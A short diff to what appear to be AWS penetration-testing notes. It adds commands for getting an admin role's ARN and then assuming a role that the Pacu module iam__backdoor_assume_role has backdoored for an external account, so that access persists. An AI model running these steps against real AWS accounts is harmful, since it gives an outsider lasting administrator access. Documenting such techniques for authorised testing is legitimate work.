@@ -44,8 +44,13 @@ run iam__backdoor_assume_role
 run iam__backdoor_assume_role --role-names Administrators --user-arns <full ARN of your external account>
 ```
 
-#### Use the external AWS account backdoor
-- Not sure how to get ARN of the policy
+### Use A external AWS account backdoor
+#### Get ARN of role
+```
+sudo aws iam get-role --role-name <ADMIN> --profile <PROFILE>
+```
+
+#### Create backdoor
 ```
 sudo aws sts assume-role --role-arn <Full ARN of Backdoored Role> --role-session-name persist --profile <personal AWS account profile>
 ```
